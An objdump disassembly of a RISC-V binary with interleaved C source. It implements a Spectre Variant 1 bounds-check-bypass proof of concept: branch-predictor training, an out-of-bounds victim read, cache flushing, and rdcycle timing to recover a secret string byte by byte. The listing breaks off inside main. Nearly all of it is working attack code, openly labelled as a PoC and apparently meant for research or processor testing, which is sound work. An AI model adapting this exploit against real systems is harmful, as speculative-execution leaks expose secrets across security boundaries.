
bin/spectreV1.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text:

00000000000100b0 <_start>:
   100b0:	0000d197          	auipc	gp,0xd
   100b4:	90818193          	addi	gp,gp,-1784 # 1c9b8 <__global_pointer$>
   100b8:	86018513          	addi	a0,gp,-1952 # 1c218 <_edata>
   100bc:	00221617          	auipc	a2,0x221
   100c0:	a6c60613          	addi	a2,a2,-1428 # 230b28 <_end>
   100c4:	8e09                	sub	a2,a2,a0
   100c6:	4581                	li	a1,0
   100c8:	792000ef          	jal	ra,1085a <memset>
   100cc:	00000517          	auipc	a0,0x0
   100d0:	6e450513          	addi	a0,a0,1764 # 107b0 <__libc_fini_array>
   100d4:	6b2000ef          	jal	ra,10786 <atexit>
   100d8:	720000ef          	jal	ra,107f8 <__libc_init_array>
   100dc:	4502                	lw	a0,0(sp)
   100de:	002c                	addi	a1,sp,8
   100e0:	4601                	li	a2,0
   100e2:	42a000ef          	jal	ra,1050c <main>
   100e6:	6ac0006f          	j	10792 <exit>

00000000000100ea <_fini>:
   100ea:	8082                	ret

00000000000100ec <deregister_tm_clones>:
   100ec:	6571                	lui	a0,0x1c
   100ee:	67f1                	lui	a5,0x1c
   100f0:	1b850713          	addi	a4,a0,440 # 1c1b8 <__TMC_END__>
   100f4:	1b878793          	addi	a5,a5,440 # 1c1b8 <__TMC_END__>
   100f8:	00e78b63          	beq	a5,a4,1010e <deregister_tm_clones+0x22>
   100fc:	00000337          	lui	t1,0x0
   10100:	00030313          	mv	t1,t1
   10104:	00030563          	beqz	t1,1010e <deregister_tm_clones+0x22>
   10108:	1b850513          	addi	a0,a0,440
   1010c:	8302                	jr	t1
   1010e:	8082                	ret

0000000000010110 <register_tm_clones>:
   10110:	67f1                	lui	a5,0x1c
   10112:	6571                	lui	a0,0x1c
   10114:	1b878593          	addi	a1,a5,440 # 1c1b8 <__TMC_END__>
   10118:	1b850793          	addi	a5,a0,440 # 1c1b8 <__TMC_END__>
   1011c:	8d9d                	sub	a1,a1,a5
   1011e:	858d                	srai	a1,a1,0x3
   10120:	4789                	li	a5,2
   10122:	02f5c5b3          	div	a1,a1,a5
   10126:	c991                	beqz	a1,1013a <register_tm_clones+0x2a>
   10128:	00000337          	lui	t1,0x0
   1012c:	00030313          	mv	t1,t1
   10130:	00030563          	beqz	t1,1013a <register_tm_clones+0x2a>
   10134:	1b850513          	addi	a0,a0,440
   10138:	8302                	jr	t1
   1013a:	8082                	ret

000000000001013c <__do_global_dtors_aux>:
   1013c:	8881c703          	lbu	a4,-1912(gp) # 1c240 <completed.5212>
   10140:	eb15                	bnez	a4,10174 <__do_global_dtors_aux+0x38>
   10142:	1141                	addi	sp,sp,-16
   10144:	e022                	sd	s0,0(sp)
   10146:	e406                	sd	ra,8(sp)
   10148:	843e                	mv	s0,a5
   1014a:	fa3ff0ef          	jal	ra,100ec <deregister_tm_clones>
   1014e:	000007b7          	lui	a5,0x0
   10152:	00078793          	mv	a5,a5
   10156:	cb81                	beqz	a5,10166 <__do_global_dtors_aux+0x2a>
   10158:	656d                	lui	a0,0x1b
   1015a:	00050513          	mv	a0,a0
   1015e:	ffff0097          	auipc	ra,0xffff0
   10162:	ea2080e7          	jalr	-350(ra) # 0 <_start-0x100b0>
   10166:	4785                	li	a5,1
   10168:	88f18423          	sb	a5,-1912(gp) # 1c240 <completed.5212>
   1016c:	60a2                	ld	ra,8(sp)
   1016e:	6402                	ld	s0,0(sp)
   10170:	0141                	addi	sp,sp,16
   10172:	8082                	ret
   10174:	8082                	ret

0000000000010176 <frame_dummy>:
   10176:	000007b7          	lui	a5,0x0
   1017a:	00078793          	mv	a5,a5
   1017e:	cf91                	beqz	a5,1019a <frame_dummy+0x24>
   10180:	656d                	lui	a0,0x1b
   10182:	1141                	addi	sp,sp,-16
   10184:	89018593          	addi	a1,gp,-1904 # 1c248 <object.5217>
   10188:	00050513          	mv	a0,a0
   1018c:	e406                	sd	ra,8(sp)
   1018e:	ffff0097          	auipc	ra,0xffff0
   10192:	e72080e7          	jalr	-398(ra) # 0 <_start-0x100b0>
   10196:	60a2                	ld	ra,8(sp)
   10198:	0141                	addi	sp,sp,16
   1019a:	f77ff06f          	j	10110 <register_tm_clones>

000000000001019e <flushCache>:
uint8_t unusedarr2[L1_SZ_BYTES];
volatile uint8_t dummyMem3[8 * L1_SZ_BYTES];
uint8_t unusedarr3[L1_SZ_BYTES];
volatile uint8_t dummyMem4[16 * L1_SZ_BYTES];

void flushCache(){
   1019e:	7179                	addi	sp,sp,-48
   101a0:	f406                	sd	ra,40(sp)
   101a2:	f022                	sd	s0,32(sp)
   101a4:	1800                	addi	s0,sp,48
    volatile uint8_t dummy = 0;
   101a6:	fc040fa3          	sb	zero,-33(s0)
    int tmpNum = 2*1024;
   101aa:	6785                	lui	a5,0x1
   101ac:	8007879b          	addiw	a5,a5,-2048
   101b0:	fef42023          	sw	a5,-32(s0)

    for(int idx=0;idx<tmpNum;idx++){
   101b4:	fe042623          	sw	zero,-20(s0)
   101b8:	a01d                	j	101de <flushCache+0x40>
        dummy = rand()%tmpNum;
   101ba:	027000ef          	jal	ra,109e0 <rand>
   101be:	87aa                	mv	a5,a0
   101c0:	873e                	mv	a4,a5
   101c2:	fe042783          	lw	a5,-32(s0)
   101c6:	02f767bb          	remw	a5,a4,a5
   101ca:	2781                	sext.w	a5,a5
   101cc:	0ff7f793          	andi	a5,a5,255
   101d0:	fcf40fa3          	sb	a5,-33(s0)
    for(int idx=0;idx<tmpNum;idx++){
   101d4:	fec42783          	lw	a5,-20(s0)
   101d8:	2785                	addiw	a5,a5,1
   101da:	fef42623          	sw	a5,-20(s0)
   101de:	fec42703          	lw	a4,-20(s0)
   101e2:	fe042783          	lw	a5,-32(s0)
   101e6:	2701                	sext.w	a4,a4
   101e8:	2781                	sext.w	a5,a5
   101ea:	fcf748e3          	blt	a4,a5,101ba <flushCache+0x1c>
      // printf("dummy = %d\n",dummy);   
    }
    tmpNum = 4*1024;
   101ee:	6785                	lui	a5,0x1
   101f0:	fef42023          	sw	a5,-32(s0)
    for(int idx=0;idx<tmpNum;idx++){
   101f4:	fe042423          	sw	zero,-24(s0)
   101f8:	a01d                	j	1021e <flushCache+0x80>
        dummy = rand()%tmpNum;
   101fa:	7e6000ef          	jal	ra,109e0 <rand>
   101fe:	87aa                	mv	a5,a0
   10200:	873e                	mv	a4,a5
   10202:	fe042783          	lw	a5,-32(s0)
   10206:	02f767bb          	remw	a5,a4,a5
   1020a:	2781                	sext.w	a5,a5
   1020c:	0ff7f793          	andi	a5,a5,255
   10210:	fcf40fa3          	sb	a5,-33(s0)
    for(int idx=0;idx<tmpNum;idx++){
   10214:	fe842783          	lw	a5,-24(s0)
   10218:	2785                	addiw	a5,a5,1
   1021a:	fef42423          	sw	a5,-24(s0)
   1021e:	fe842703          	lw	a4,-24(s0)
   10222:	fe042783          	lw	a5,-32(s0)
   10226:	2701                	sext.w	a4,a4
   10228:	2781                	sext.w	a5,a5
   1022a:	fcf748e3          	blt	a4,a5,101fa <flushCache+0x5c>
      //printf("dummy = %d\n",dummy);   
    }
    tmpNum = 8*1024;
   1022e:	6789                	lui	a5,0x2
   10230:	fef42023          	sw	a5,-32(s0)
    for(int idx=0;idx<tmpNum;idx++){
   10234:	fe042223          	sw	zero,-28(s0)
   10238:	a01d                	j	1025e <flushCache+0xc0>
        dummy = rand()%tmpNum;
   1023a:	7a6000ef          	jal	ra,109e0 <rand>
   1023e:	87aa                	mv	a5,a0
   10240:	873e                	mv	a4,a5
   10242:	fe042783          	lw	a5,-32(s0)
   10246:	02f767bb          	remw	a5,a4,a5
   1024a:	2781                	sext.w	a5,a5
   1024c:	0ff7f793          	andi	a5,a5,255
   10250:	fcf40fa3          	sb	a5,-33(s0)
    for(int idx=0;idx<tmpNum;idx++){
   10254:	fe442783          	lw	a5,-28(s0)
   10258:	2785                	addiw	a5,a5,1
   1025a:	fef42223          	sw	a5,-28(s0)
   1025e:	fe442703          	lw	a4,-28(s0)
   10262:	fe042783          	lw	a5,-32(s0)
   10266:	2701                	sext.w	a4,a4
   10268:	2781                	sext.w	a5,a5
   1026a:	fcf748e3          	blt	a4,a5,1023a <flushCache+0x9c>
    // tmpNum = 16*1024;
    // for(int idx=0;idx<tmpNum;idx++){
    //     dummy = dummyMem3[rand()%tmpNum];
    //      printf("%lld\n",dummy);
    // }
   printf("Flush\n");       
   1026e:	67e9                	lui	a5,0x1a
   10270:	11078513          	addi	a0,a5,272 # 1a110 <__clzdi2+0x30>
   10274:	756000ef          	jal	ra,109ca <puts>
}
   10278:	0001                	nop
   1027a:	70a2                	ld	ra,40(sp)
   1027c:	7402                	ld	s0,32(sp)
   1027e:	6145                	addi	sp,sp,48
   10280:	8082                	ret

0000000000010282 <topTwoIdx>:
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
//char* secretString = "!\"#ThisIsTheBabyBoomerTest";
char* secretString = "!\"#ThisIsTheSpectreV1Poc!!";

void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
   10282:	7139                	addi	sp,sp,-64
   10284:	fc22                	sd	s0,56(sp)
   10286:	0080                	addi	s0,sp,64
   10288:	fca43c23          	sd	a0,-40(s0)
   1028c:	fcb43823          	sd	a1,-48(s0)
   10290:	fcc43423          	sd	a2,-56(s0)
   10294:	fcd43023          	sd	a3,-64(s0)
    outValArray[0] = 0;
   10298:	fc043783          	ld	a5,-64(s0)
   1029c:	0007b023          	sd	zero,0(a5)
    outValArray[1] = 0;
   102a0:	fc043783          	ld	a5,-64(s0)
   102a4:	07a1                	addi	a5,a5,8
   102a6:	0007b023          	sd	zero,0(a5)

    for (uint64_t i = 0; i < inArraySize; ++i){
   102aa:	fe043423          	sd	zero,-24(s0)
   102ae:	a075                	j	1035a <topTwoIdx+0xd8>
        if (inArray[i] > outValArray[0]){
   102b0:	fe843783          	ld	a5,-24(s0)
   102b4:	078e                	slli	a5,a5,0x3
   102b6:	fd843703          	ld	a4,-40(s0)
   102ba:	97ba                	add	a5,a5,a4
   102bc:	6398                	ld	a4,0(a5)
   102be:	fc043783          	ld	a5,-64(s0)
   102c2:	639c                	ld	a5,0(a5)
   102c4:	04e7f563          	bleu	a4,a5,1030e <topTwoIdx+0x8c>
            outValArray[1] = outValArray[0];
   102c8:	fc043783          	ld	a5,-64(s0)
   102cc:	07a1                	addi	a5,a5,8
   102ce:	fc043703          	ld	a4,-64(s0)
   102d2:	6318                	ld	a4,0(a4)
   102d4:	e398                	sd	a4,0(a5)
            outValArray[0] = inArray[i];
   102d6:	fe843783          	ld	a5,-24(s0)
   102da:	078e                	slli	a5,a5,0x3
   102dc:	fd843703          	ld	a4,-40(s0)
   102e0:	97ba                	add	a5,a5,a4
   102e2:	6398                	ld	a4,0(a5)
   102e4:	fc043783          	ld	a5,-64(s0)
   102e8:	e398                	sd	a4,0(a5)
            outIdxArray[1] = outIdxArray[0];
   102ea:	fc843783          	ld	a5,-56(s0)
   102ee:	0785                	addi	a5,a5,1
   102f0:	fc843703          	ld	a4,-56(s0)
   102f4:	00074703          	lbu	a4,0(a4)
   102f8:	00e78023          	sb	a4,0(a5)
            outIdxArray[0] = i;
   102fc:	fe843783          	ld	a5,-24(s0)
   10300:	0ff7f713          	andi	a4,a5,255
   10304:	fc843783          	ld	a5,-56(s0)
   10308:	00e78023          	sb	a4,0(a5)
   1030c:	a091                	j	10350 <topTwoIdx+0xce>
        }
        else if (inArray[i] > outValArray[1]){
   1030e:	fe843783          	ld	a5,-24(s0)
   10312:	078e                	slli	a5,a5,0x3
   10314:	fd843703          	ld	a4,-40(s0)
   10318:	97ba                	add	a5,a5,a4
   1031a:	6398                	ld	a4,0(a5)
   1031c:	fc043783          	ld	a5,-64(s0)
   10320:	07a1                	addi	a5,a5,8
   10322:	639c                	ld	a5,0(a5)
   10324:	02e7f663          	bleu	a4,a5,10350 <topTwoIdx+0xce>
            outValArray[1] = inArray[i];
   10328:	fe843783          	ld	a5,-24(s0)
   1032c:	078e                	slli	a5,a5,0x3
   1032e:	fd843703          	ld	a4,-40(s0)
   10332:	973e                	add	a4,a4,a5
   10334:	fc043783          	ld	a5,-64(s0)
   10338:	07a1                	addi	a5,a5,8
   1033a:	6318                	ld	a4,0(a4)
   1033c:	e398                	sd	a4,0(a5)
            outIdxArray[1] = i;
   1033e:	fc843783          	ld	a5,-56(s0)
   10342:	0785                	addi	a5,a5,1
   10344:	fe843703          	ld	a4,-24(s0)
   10348:	0ff77713          	andi	a4,a4,255
   1034c:	00e78023          	sb	a4,0(a5)
    for (uint64_t i = 0; i < inArraySize; ++i){
   10350:	fe843783          	ld	a5,-24(s0)
   10354:	0785                	addi	a5,a5,1
   10356:	fef43423          	sd	a5,-24(s0)
   1035a:	fe843703          	ld	a4,-24(s0)
   1035e:	fd043783          	ld	a5,-48(s0)
   10362:	f4f767e3          	bltu	a4,a5,102b0 <topTwoIdx+0x2e>
        }
    }
}
   10366:	0001                	nop
   10368:	7462                	ld	s0,56(sp)
   1036a:	6121                	addi	sp,sp,64
   1036c:	8082                	ret

000000000001036e <victimFunc>:
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void victimFunc(uint64_t idx){
   1036e:	7119                	addi	sp,sp,-128
   10370:	fc86                	sd	ra,120(sp)
   10372:	f8a2                	sd	s0,112(sp)
   10374:	0100                	addi	s0,sp,128
   10376:	f8a43423          	sd	a0,-120(s0)
     uint8_t dummy = 2;
   1037a:	4789                	li	a5,2
   1037c:	fef407a3          	sb	a5,-17(s0)
uint64_t   start=0, diff=0;
   10380:	fe043023          	sd	zero,-32(s0)
   10384:	fc043c23          	sd	zero,-40(s0)
 uint8_t    dummy1 = 0;
   10388:	fc040ba3          	sb	zero,-41(s0)
    //     "fcvt.lu.s	%[out], fa5, rtz\n"
    //     : [out] "=r" (array1_sz)
    //     : [inout] "r" (array1_sz), [in] "r" (dummy)
    //     : "fa4", "fa5");
    // }
    flushCache();
   1038c:	e13ff0ef          	jal	ra,1019e <flushCache>
    start = rdcycle();
   10390:	c00027f3          	rdcycle	a5
   10394:	fcf43423          	sd	a5,-56(s0)
   10398:	fc843783          	ld	a5,-56(s0)
   1039c:	fef43023          	sd	a5,-32(s0)
    dummy1= array2[array1[idx] * L1_BLOCK_SZ_BYTES];
   103a0:	67ed                	lui	a5,0x1b
   103a2:	01878713          	addi	a4,a5,24 # 1b018 <__fini_array_end>
   103a6:	f8843783          	ld	a5,-120(s0)
   103aa:	97ba                	add	a5,a5,a4
   103ac:	0007c783          	lbu	a5,0(a5)
   103b0:	2781                	sext.w	a5,a5
   103b2:	0067979b          	slliw	a5,a5,0x6
   103b6:	0007871b          	sext.w	a4,a5
   103ba:	0003d7b7          	lui	a5,0x3d
   103be:	ae078793          	addi	a5,a5,-1312 # 3cae0 <array2>
   103c2:	97ba                	add	a5,a5,a4
   103c4:	0007c783          	lbu	a5,0(a5)
   103c8:	fcf40ba3          	sb	a5,-41(s0)
    diff = (rdcycle() - start);
   103cc:	c00027f3          	rdcycle	a5
   103d0:	fcf43023          	sd	a5,-64(s0)
   103d4:	fc043703          	ld	a4,-64(s0)
   103d8:	fe043783          	ld	a5,-32(s0)
   103dc:	40f707b3          	sub	a5,a4,a5
   103e0:	fcf43c23          	sd	a5,-40(s0)
     printf("test:read from ram, cycles = %lu\n", diff); 
   103e4:	fd843583          	ld	a1,-40(s0)
   103e8:	67e9                	lui	a5,0x1a
   103ea:	13878513          	addi	a0,a5,312 # 1a138 <__clzdi2+0x58>
   103ee:	538000ef          	jal	ra,10926 <printf>
       start = rdcycle();
   103f2:	c00027f3          	rdcycle	a5
   103f6:	faf43c23          	sd	a5,-72(s0)
   103fa:	fb843783          	ld	a5,-72(s0)
   103fe:	fef43023          	sd	a5,-32(s0)
    dummy1= array2[array1[idx] * L1_BLOCK_SZ_BYTES];
   10402:	67ed                	lui	a5,0x1b
   10404:	01878713          	addi	a4,a5,24 # 1b018 <__fini_array_end>
   10408:	f8843783          	ld	a5,-120(s0)
   1040c:	97ba                	add	a5,a5,a4
   1040e:	0007c783          	lbu	a5,0(a5)
   10412:	2781                	sext.w	a5,a5
   10414:	0067979b          	slliw	a5,a5,0x6
   10418:	0007871b          	sext.w	a4,a5
   1041c:	0003d7b7          	lui	a5,0x3d
   10420:	ae078793          	addi	a5,a5,-1312 # 3cae0 <array2>
   10424:	97ba                	add	a5,a5,a4
   10426:	0007c783          	lbu	a5,0(a5)
   1042a:	fcf40ba3          	sb	a5,-41(s0)
    diff = (rdcycle() - start);
   1042e:	c00027f3          	rdcycle	a5
   10432:	faf43823          	sd	a5,-80(s0)
   10436:	fb043703          	ld	a4,-80(s0)
   1043a:	fe043783          	ld	a5,-32(s0)
   1043e:	40f707b3          	sub	a5,a4,a5
   10442:	fcf43c23          	sd	a5,-40(s0)
     printf("test:read from cache, cycles = %lu\n", diff); 
   10446:	fd843583          	ld	a1,-40(s0)
   1044a:	67e9                	lui	a5,0x1a
   1044c:	16078513          	addi	a0,a5,352 # 1a160 <__clzdi2+0x80>
   10450:	4d6000ef          	jal	ra,10926 <printf>
     flushCache(); 
   10454:	d4bff0ef          	jal	ra,1019e <flushCache>

    if (idx < array1_sz){
   10458:	8301b783          	ld	a5,-2000(gp) # 1c1e8 <array1_sz>
   1045c:	f8843703          	ld	a4,-120(s0)
   10460:	02f77863          	bleu	a5,a4,10490 <victimFunc+0x122>
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
   10464:	67ed                	lui	a5,0x1b
   10466:	01878713          	addi	a4,a5,24 # 1b018 <__fini_array_end>
   1046a:	f8843783          	ld	a5,-120(s0)
   1046e:	97ba                	add	a5,a5,a4
   10470:	0007c783          	lbu	a5,0(a5)
   10474:	2781                	sext.w	a5,a5
   10476:	0067979b          	slliw	a5,a5,0x6
   1047a:	0007871b          	sext.w	a4,a5
   1047e:	0003d7b7          	lui	a5,0x3d
   10482:	ae078793          	addi	a5,a5,-1312 # 3cae0 <array2>
   10486:	97ba                	add	a5,a5,a4
   10488:	0007c783          	lbu	a5,0(a5)
   1048c:	fef407a3          	sb	a5,-17(s0)
    }
        start = rdcycle();
   10490:	c00027f3          	rdcycle	a5
   10494:	faf43423          	sd	a5,-88(s0)
   10498:	fa843783          	ld	a5,-88(s0)
   1049c:	fef43023          	sd	a5,-32(s0)
        dummy1=  array2[array1[idx] * L1_BLOCK_SZ_BYTES];
   104a0:	67ed                	lui	a5,0x1b
   104a2:	01878713          	addi	a4,a5,24 # 1b018 <__fini_array_end>
   104a6:	f8843783          	ld	a5,-120(s0)
   104aa:	97ba                	add	a5,a5,a4
   104ac:	0007c783          	lbu	a5,0(a5)
   104b0:	2781                	sext.w	a5,a5
   104b2:	0067979b          	slliw	a5,a5,0x6
   104b6:	0007871b          	sext.w	a4,a5
   104ba:	0003d7b7          	lui	a5,0x3d
   104be:	ae078793          	addi	a5,a5,-1312 # 3cae0 <array2>
   104c2:	97ba                	add	a5,a5,a4
   104c4:	0007c783          	lbu	a5,0(a5)
   104c8:	fcf40ba3          	sb	a5,-41(s0)
        diff = (rdcycle() - start);
   104cc:	c00027f3          	rdcycle	a5
   104d0:	faf43023          	sd	a5,-96(s0)
   104d4:	fa043703          	ld	a4,-96(s0)
   104d8:	fe043783          	ld	a5,-32(s0)
   104dc:	40f707b3          	sub	a5,a4,a5
   104e0:	fcf43c23          	sd	a5,-40(s0)
     printf("test:read from cache, cycles = %lu\n", diff);  
   104e4:	fd843583          	ld	a1,-40(s0)
   104e8:	67e9                	lui	a5,0x1a
   104ea:	16078513          	addi	a0,a5,352 # 1a160 <__clzdi2+0x80>
   104ee:	438000ef          	jal	ra,10926 <printf>

    // bound speculation here just in case it goes over
    dummy = rdcycle();
   104f2:	c00027f3          	rdcycle	a5
   104f6:	f8f43c23          	sd	a5,-104(s0)
   104fa:	f9843783          	ld	a5,-104(s0)
   104fe:	fef407a3          	sb	a5,-17(s0)
}
   10502:	0001                	nop
   10504:	70e6                	ld	ra,120(sp)
   10506:	7446                	ld	s0,112(sp)
   10508:	6109                	addi	sp,sp,128
   1050a:	8082                	ret

000000000001050c <main>:

int main(void){
   1050c:	7171                	addi	sp,sp,-176
   1050e:	f506                	sd	ra,168(sp)
   10510:	f122                	sd	s0,160(sp)
   10512:	1900                	addi	s0,sp,176
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
   10514:	8381b783          	ld	a5,-1992(gp) # 1c1f0 <secretString>
   10518:	873e                	mv	a4,a5
   1051a:	67ed                	lui	a5,0x1b
   1051c:	01878793          	addi	a5,a5,24 # 1b018 <__fini_array_end>
   10520:	40f707b3          	sub	a5,a4,a5
   10524:	fef43423          	sd	a5,-24(s0)
    uint64_t start, diff, passInIdx, randIdx;
    uint8_t dummy = 0;
   10528:	fe0403a3          	sb	zero,-25(s0)
    static uint64_t results[256];

    printf("================= This is a POC of spectre_v1 (Branch Condition Check Bypass) ========================= \n");
   1052c:	67e9                	lui	a5,0x1a
   1052e:	18878513          	addi	a0,a5,392 # 1a188 <__clzdi2+0xa8>
   10532:	498000ef          	jal	ra,109ca <puts>
    printf("the secret key is:%s \n", secretString);
   10536:	8381b783          	ld	a5,-1992(gp) # 1c1f0 <secretString>
   1053a:	85be                	mv	a1,a5
   1053c:	67e9                	lui	a5,0x1a
   1053e:	1f878513          	addi	a0,a5,504 # 1a1f8 <__clzdi2+0x118>
   10542:	3e4000ef          	jal	ra,10926 <printf>

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
   10546:	fc043c23          	sd	zero,-40(s0)
   1054a:	a41d                	j	10770 <main+0x264>

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
   1054c:	fc043823          	sd	zero,-48(s0)
   10550:	a839                	j	1056e <main+0x62>
            results[cIdx] = 0;
   10552:	67f1                	lui	a5,0x1c
   10554:	fd043703          	ld	a4,-48(s0)
   10558:	070e                	slli	a4,a4,0x3
   1055a:	27878793          	addi	a5,a5,632 # 1c278 <results.3004>
   1055e:	97ba                	add	a5,a5,a4
   10560:	0007b023          	sd	zero,0(a5)
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
   10564:	fd043783          	ld	a5,-48(s0)
   10568:	0785                	addi	a5,a5,1
   1056a:	fcf43823          	sd	a5,-48(s0)
   1056e:	fd043703          	ld	a4,-48(s0)
   10572:	0ff00793          	li	a5,255
   10576:	fce7fee3          	bleu	a4,a5,10552 <main+0x46>
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
   1057a:	fc043423          	sd	zero,-56(s0)
   1057e:	a29d                	j	106e4 <main+0x1d8>

            // make sure array you read from is not in the cache
            //flushCache((uint64_t)arrayF2, sizeof(array2));
            flushCache();
   10580:	c1fff0ef          	jal	ra,1019e <flushCache>
            //asm("dcache.iall");
            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
   10584:	20000793          	li	a5,512
   10588:	fcf43023          	sd	a5,-64(s0)
   1058c:	a871                	j	10628 <main+0x11c>
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = atkRound % array1_sz;
   1058e:	8301b783          	ld	a5,-2000(gp) # 1c1e8 <array1_sz>
   10592:	fc843703          	ld	a4,-56(s0)
   10596:	02f777b3          	remu	a5,a4,a5
   1059a:	f8f43023          	sd	a5,-128(s0)
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
   1059e:	fc043703          	ld	a4,-64(s0)
   105a2:	20100793          	li	a5,513
   105a6:	02f767b3          	rem	a5,a4,a5
   105aa:	17fd                	addi	a5,a5,-1
   105ac:	873e                	mv	a4,a5
   105ae:	77c1                	lui	a5,0xffff0
   105b0:	8ff9                	and	a5,a5,a4
   105b2:	f6f43c23          	sd	a5,-136(s0)
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
   105b6:	f7843783          	ld	a5,-136(s0)
   105ba:	83c1                	srli	a5,a5,0x10
   105bc:	f7843703          	ld	a4,-136(s0)
   105c0:	8fd9                	or	a5,a5,a4
   105c2:	f6f43c23          	sd	a5,-136(s0)
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
   105c6:	fe843703          	ld	a4,-24(s0)
   105ca:	f8043783          	ld	a5,-128(s0)
   105ce:	8f3d                	xor	a4,a4,a5
   105d0:	f7843783          	ld	a5,-136(s0)
   105d4:	8ff9                	and	a5,a5,a4
   105d6:	f8043703          	ld	a4,-128(s0)
   105da:	8fb9                	xor	a5,a5,a4
   105dc:	f6f43c23          	sd	a5,-136(s0)

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 100; ++k){
   105e0:	fa043c23          	sd	zero,-72(s0)
   105e4:	a031                	j	105f0 <main+0xe4>
   105e6:	fb843783          	ld	a5,-72(s0)
   105ea:	0785                	addi	a5,a5,1
   105ec:	faf43c23          	sd	a5,-72(s0)
   105f0:	fb843703          	ld	a4,-72(s0)
   105f4:	06300793          	li	a5,99
   105f8:	fee7f7e3          	bleu	a4,a5,105e6 <main+0xda>
                    asm("");
                }
                printf("len = [%lu],atkRound=[%lu],j=[%lu],passIndex=[%lu]\n",len,atkRound,j,passInIdx);
   105fc:	f7843703          	ld	a4,-136(s0)
   10600:	fc043683          	ld	a3,-64(s0)
   10604:	fc843603          	ld	a2,-56(s0)
   10608:	fd843583          	ld	a1,-40(s0)
   1060c:	67e9                	lui	a5,0x1a
   1060e:	21078513          	addi	a0,a5,528 # 1a210 <__clzdi2+0x130>
   10612:	314000ef          	jal	ra,10926 <printf>
                //printf("passIndex=[%lu]\n",passInIdx);
                // call function to train or attack
                victimFunc(passInIdx);
   10616:	f7843503          	ld	a0,-136(s0)
   1061a:	d55ff0ef          	jal	ra,1036e <victimFunc>
            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
   1061e:	fc043783          	ld	a5,-64(s0)
   10622:	17fd                	addi	a5,a5,-1
   10624:	fcf43023          	sd	a5,-64(s0)
   10628:	fc043783          	ld	a5,-64(s0)
   1062c:	f607d1e3          	bgez	a5,1058e <main+0x82>
            }
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
   10630:	fa043823          	sd	zero,-80(s0)
   10634:	a869                	j	106ce <main+0x1c2>
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
   10636:	fa043423          	sd	zero,-88(s0)
                start = rdcycle();
   1063a:	c00027f3          	rdcycle	a5
   1063e:	faf43023          	sd	a5,-96(s0)
   10642:	fa043783          	ld	a5,-96(s0)
   10646:	f8f43c23          	sd	a5,-104(s0)
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
   1064a:	fb043783          	ld	a5,-80(s0)
   1064e:	00679713          	slli	a4,a5,0x6
   10652:	0003d7b7          	lui	a5,0x3d
   10656:	ae078793          	addi	a5,a5,-1312 # 3cae0 <array2>
   1065a:	97ba                	add	a5,a5,a4
   1065c:	0007c703          	lbu	a4,0(a5)
   10660:	fe744783          	lbu	a5,-25(s0)
   10664:	8ff9                	and	a5,a5,a4
   10666:	fef403a3          	sb	a5,-25(s0)
                diff = (rdcycle() - start);
   1066a:	c00027f3          	rdcycle	a5
   1066e:	f8f43823          	sd	a5,-112(s0)
   10672:	f9043703          	ld	a4,-112(s0)
   10676:	f9843783          	ld	a5,-104(s0)
   1067a:	40f707b3          	sub	a5,a4,a5
   1067e:	f8f43423          	sd	a5,-120(s0)
               printf("%c,i = %lu\t",i,diff);
   10682:	f8843603          	ld	a2,-120(s0)
   10686:	fb043583          	ld	a1,-80(s0)
   1068a:	67e9                	lui	a5,0x1a
   1068c:	24878513          	addi	a0,a5,584 # 1a248 <__clzdi2+0x168>
   10690:	296000ef          	jal	ra,10926 <printf>
                if ( diff < CACHE_HIT_THRESHOLD ){
   10694:	f8843703          	ld	a4,-120(s0)
   10698:	05900793          	li	a5,89
   1069c:	02e7e463          	bltu	a5,a4,106c4 <main+0x1b8>
                    results[i] += 1;
   106a0:	67f1                	lui	a5,0x1c
   106a2:	fb043703          	ld	a4,-80(s0)
   106a6:	070e                	slli	a4,a4,0x3
   106a8:	27878793          	addi	a5,a5,632 # 1c278 <results.3004>
   106ac:	97ba                	add	a5,a5,a4
   106ae:	639c                	ld	a5,0(a5)
   106b0:	00178713          	addi	a4,a5,1
   106b4:	67f1                	lui	a5,0x1c
   106b6:	fb043683          	ld	a3,-80(s0)
   106ba:	068e                	slli	a3,a3,0x3
   106bc:	27878793          	addi	a5,a5,632 # 1c278 <results.3004>
   106c0:	97b6                	add	a5,a5,a3
   106c2:	e398                	sd	a4,0(a5)
            for (uint64_t i = 0; i < 256; ++i){
   106c4:	fb043783          	ld	a5,-80(s0)
   106c8:	0785                	addi	a5,a5,1
   106ca:	faf43823          	sd	a5,-80(s0)
   106ce:	fb043703          	ld	a4,-80(s0)
   106d2:	0ff00793          	li	a5,255
   106d6:	f6e7f0e3          	bleu	a4,a5,10636 <main+0x12a>
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
   106da:	fc843783          	ld	a5,-56(s0)
